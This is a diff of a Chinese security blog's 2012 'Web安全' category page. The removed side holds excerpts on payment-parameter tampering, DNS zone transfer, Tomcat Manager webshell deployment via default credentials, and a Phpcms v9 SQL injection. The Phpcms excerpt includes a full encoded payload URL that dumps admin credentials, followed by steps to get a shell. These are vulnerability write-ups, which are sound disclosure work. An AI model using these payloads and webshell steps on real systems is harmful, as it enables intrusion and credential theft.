@@ -1,273 +1,270 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Category: Web安全 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Category: Web安全 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Category: Web安全 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="category-icon">Web安全</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-09-28T01:07:32.000Z" itemprop="datePublished">
-          2012-09-28
-      </time>
-    
-    
-    | 
-    <a href='/tag/支付漏洞/'>支付漏洞</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/865.seo/">支付漏洞的三种常见类型 imlonghao@wooyun</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>很久很久以前剑心大叔叫我写过这样一篇文章，当时还没放假，就没去搭理他，嘿嘿。最近，小E又来找我写关于支付漏洞的文章，好吧，写就写了，趁暑假还有一点余额，就写这篇文章和大家来谈谈支付漏洞。(写得不好,大牛勿怪)</p>  <p>———-</p>  <p>根据乌云上的案例，支付漏洞一般可以分为三类：一是在支付过程中直接发送含有需支付金额的数据包；二是没有对购买数量进行限制；三是程序的异常处理。下面就和大家说说这三种情况。</p>  <p>一：支付过程中直接发送含有需支付金额的数据包(常见)</p>  <p>危害指数：星星星星星</p>  <p>这种案例非常常见，主要针对支付宝等需要第三方支付的案例。开发人员往往会为了方便，直接在支付的关键步骤数据包中直接传递需要支付的金额，这种，只需要开个Fiddler2，甚至是直接通过审查元素就可以修改到需要支付的金额。我们来看一看乌云上的几个案例：</p>  <p><a href="http://www.wooyun.org/bugs/wooyun-2010-02272">顺丰宝业务逻辑漏洞(WooYun-2011-02272)</a> @空虚浪子心</p>  <p><a href="http://www.wooyun.org/bugs/wooyun-2010-07293">淘宝网某处存在严重支付漏洞(WooYun-2012-07293)</a> @imlonghao</p>  <p><a href="http://www.wooyun.org/bugs/wooyun-2010-07380">考试吧支付缺陷(WooYun-2012-07380)</a> @jxs</p>  <p><a href="http://www.wooyun.org/bugs/wooyun-2010-07528">263通信某处存在严重支付漏洞(WooYun-2012-07528)</a> @imlonghao</p>  <p>这里我就以淘宝网的那个支付漏洞来讲解一下，淘宝网手机充值这个地方的漏洞最为典型。</p>  <p><a href="http://img.cker.in/imlonghaowooyun_F072/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/imlonghaowooyun_F072/clip_image001_thumb.jpg" width="224" height="183" /></a></p>  <p>从这个发送的数据包中，我们可以发现开发人员直接将金额(seriesPrice)和购买短信的数量(seriesNum)一起发送，这是十分危险的操作。黑客可以通过修改seriesPrice和seriesNum的值，来达到1元购买10000条短信甚至是更多的短信数量。</p>
-      
-      </p>
-      
-      <p>
-          <a href="/865.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-09-24T21:41:21.000Z" itemprop="datePublished">
-          2012-09-25
-      </time>
-    
-    
-    | 
-    <a href='/tag/DNS域传送/'>DNS域传送</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/849.seo/">爱拍DNS域传送漏洞</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        关于DNS域传送漏洞 ：DNS域传送泄露漏洞详解  &#160;  爱拍DNS域传送漏洞演示：    &#160;  nslookup命令：  &gt; server 8.8.8.8  (root) nameserver = E.ROOT-SERVERS.NET  (root) nameserver = F.ROOT-SERVERS.NET  (root) nameserver = G.ROOT-SERVERS.NET  (root) 
-      
-      </p>
-      
-      <p>
-          <a href="/849.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/865.seo/" title="支付漏洞的三种常见类型 imlonghao@wooyun" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-09-13T06:16:40.000Z" itemprop="datePublished">
-          2012-09-13
-      </time>
+    <h1 itemprop="name">支付漏洞的三种常见类型 imlonghao@wooyun</h1>
     
-    
-    | 
-    <a href='/tag/Tomcat/'>Tomcat</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/822.seo/">打造安全的Tomcat服务器</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>作者China-Linux</p>  <p>Tomcat是一个开源的Web服务器,基于tomcat的web运行效率高,因为,颇受web站长的青睐,</p>  <p>不过,在默认的配置下,其存在一定的安全隐患,.可被恶意攻击,.另外,其功能比较单纯,需要我们进一步的进行配置,本次将从安全和功能两方面谈谈基于Tomcat的Web服务器的部署.,</p>  <p>希望对大家有帮助.</p>  <p>OS: Windows Server 2003</p>  <p>IP : 125.42.207.94</p>  <p>Tomcat :apache-tomcat-6.0.18</p>  <p>1.安全测试</p>  <p>（1）登陆后台</p>  <p>（2）在Windows Server 2003 上部署Tomcat，一切保持默认。部署Tomcat的时候要记得安装JDK以及配置JDK环境。JDK的安装配置不在本节赘述。然后登陆Tomcat后台。其缺省的后台是：</p>  <p><a href="http://125.42.207.94:8080/manager/html">http://125.42.207.94:8080/manager/html</a></p>  <p>在浏览器输入该地址，回车后弹出登录框，输入缺省的用户名admin 缺省密码为空，成功登陆后台 如图（1）</p>  <p><a href="http://www.iitlab.com/attachment.php?id=1"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Tomcat_1363A/clip_image001.png" width="520" height="421" /></a></p>  <p>（2）.获得Webshell</p>  <p>（3）在Tomcat的后台有个<b>WAR file to deploy</b><b>模块</b><b>,</b></p>  <p>通过此模块我们可以上传war文件(不是rar),Tomcat可以解析WAR文件,能够将其解压成</p>  <p>Web文件,我们将一个jsp的shell用rar打包,该后缀为(本例为shell.war),将其上传到服务器,可以看到在Tomcat后台多了个shell的目录. 如图2</p>  <p><a href="http://www.iitlab.com/attachment.php?id=2"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Tomcat_1363A/clip_image002.png" width="129" height="400" /></a></p>  <p>这样一个shell就成功获取了. 如图</p>
-      
-      </p>
-      
-      <p>
-          <a href="/822.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-09-28T01:07:32.000Z" itemprop="datePublished">2012-09-28</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-09-11T21:47:22.000Z" itemprop="datePublished">
-          2012-09-12
-      </time>
-    
-    
-    | 
-    <a href='/tag/Wordpress/'>Wordpress</a>,
-    
-    <a href='/tag/SQL-Injection/'>SQL Injection</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/820.seo/">WordPress BBPress SQL Injection   Path Disclosure</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-         # Exploit Title: Wordpress plugins - bbpress Multiple Vulnerabilities.   # Date: 31 August 2012    # Author: Dark-Puzzle (Souhail Hammou)    # Vendor Website : www.bbpress.ru / www.bbpress.com    # Risk : Critical    # 
-      
-      </p>
-      
-      <p>
-          <a href="/820.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/849.seo/" title="爱拍DNS域传送漏洞" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-09-09T09:24:06.000Z" itemprop="datePublished">
-          2012-09-09
-      </time>
+    <h1 itemprop="name">爱拍DNS域传送漏洞</h1>
     
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/816.seo/">微信任意用户密码修改漏洞</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><b><a href="http://pkav.net/">PKAV技术宅社区</a></b><a href="http://pkav.net/2012/09/%E5%BE%AE%E4%BF%A1%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/">http://pkav.net/2012/09/%E5%BE%AE%E4%BF%A1%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/</a></p>  <p>今天发现个微信群发的<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>.还没玩.就被修补了.    <br />于是就有了这个漏洞的产生.    <br />同样问题产生在重置用户密码的环节.    <br />在微信官方的首页上发现新增了如下功能模块</p>  <p><a href="http://pkav.net/wp-content/uploads/2012/09/1.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/1dfa7939fe87_1385/clip_image001.jpg" width="525" height="276" /></a>    <br />访问后看到这个功能.来了兴趣</p>  <p><a href="http://pkav.net/wp-content/uploads/2012/09/2.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/1dfa7939fe87_1385/clip_image002.jpg" width="712" height="370" /></a>    <br />在这个页面输入一个已经注册了微信的手机号.</p>  <p><a href="http://pkav.net/wp-content/uploads/2012/09/3.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/1dfa7939fe87_1385/clip_image003.jpg" width="415" height="323" /></a></p>
-      
-      </p>
-      
-      <p>
-          <a href="/816.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-09-24T21:41:21.000Z" itemprop="datePublished">2012-09-25</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-09-07T04:33:36.000Z" itemprop="datePublished">
-          2012-09-07
-      </time>
-    
-    
-    | 
-    <a href='/tag/SQL注入/'>SQL注入</a>,
-    
-    <a href='/tag/0day/'>0day</a>,
-    
-    <a href='/tag/Phpcms/'>Phpcms</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/808.seo/">Phpcms v9最新Sql注入0day(转自乌云)</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>在phpcms/api.php?op=add_favorite中使用了urldecode，导致了一个sqlinject漏洞。$title = urldecode($title);   <br />省略??    <br />$data = array(‘title’=&gt;$title, ‘url’=&gt;$url, ‘adddate’=&gt;SYS_TIME, ‘userid’=&gt;$userid);    <br />省略??    <br />$favorite_db-&gt;insert($data);    <br /></p>  <p>(需要你先注册一个账户并且登陆后访问那个接口文件才会报错,进而<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a>！）    <br />====================================================================    <br />利用POC：    <br />1、注册用户后，访问如下URL获取admin表的前缀：<a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527</a>    <br />2、修改如下URL中的admin表前缀名(xxoo_admin)，直接爆出管理员的用户名:密码:随机字串    <br /><a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271</a>    <br />MD5能破解    <br />后台拿shell    <br />进入后台后点击界面–模版风格–随便找个页面点击修改    <br />插入代码后点击提交..    <br />然后回到模版管理找到刚才修改的页面，点击 可视化..    <br /><a href="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001_thumb.jpg" width="339" height="318" /></a>    <br />恩，代码执行了</p>
-      
-      </p>
-      
-      <p>
-          <a href="/808.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/822.seo/" title="打造安全的Tomcat服务器" itemprop="url">
   
-  <nav class="pagination" role="pagination">
-    <a class="newer-posts" href="/category/Web安全/page/8/">← Newer Posts</a>
-    <span class="page-number">Page 9 of 15</span>
-    <a class="older-posts" href="/category/Web安全/page/10/">Older Posts →</a>
+    <h1 itemprop="name">打造安全的Tomcat服务器</h1>
+    
+    <time datetime="2012-09-13T06:16:40.000Z" itemprop="datePublished">2012-09-13</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/820.seo/" title="WordPress BBPress SQL Injection   Path Disclosure" itemprop="url">
+  
+    <h1 itemprop="name">WordPress BBPress SQL Injection   Path Disclosure</h1>
+    
+    <time datetime="2012-09-11T21:47:22.000Z" itemprop="datePublished">2012-09-12</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/816.seo/" title="微信任意用户密码修改漏洞" itemprop="url">
+  
+    <h1 itemprop="name">微信任意用户密码修改漏洞</h1>
+    
+    <time datetime="2012-09-09T09:24:06.000Z" itemprop="datePublished">2012-09-09</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/808.seo/" title="Phpcms v9最新Sql注入0day(转自乌云)" itemprop="url">
+  
+    <h1 itemprop="name">Phpcms v9最新Sql注入0day(转自乌云)</h1>
+    
+    <time datetime="2012-09-07T04:33:36.000Z" itemprop="datePublished">2012-09-07</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix archive-nav">
+    <a class="extend prev" rel="prev" href="/category/Web安全/page/8/">&laquo; 上一页</a><a class="page-number" href="/category/Web安全/">1</a><span class="space">&hellip;</span><a class="page-number" href="/category/Web安全/page/7/">7</a><a class="page-number" href="/category/Web安全/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/category/Web安全/page/10/">10</a><a class="page-number" href="/category/Web安全/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/category/Web安全/page/15/">15</a><a class="extend next" rel="next" href="/category/Web安全/page/10/">下一页 &raquo;</a>
   </nav>
-</main>
 
-
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
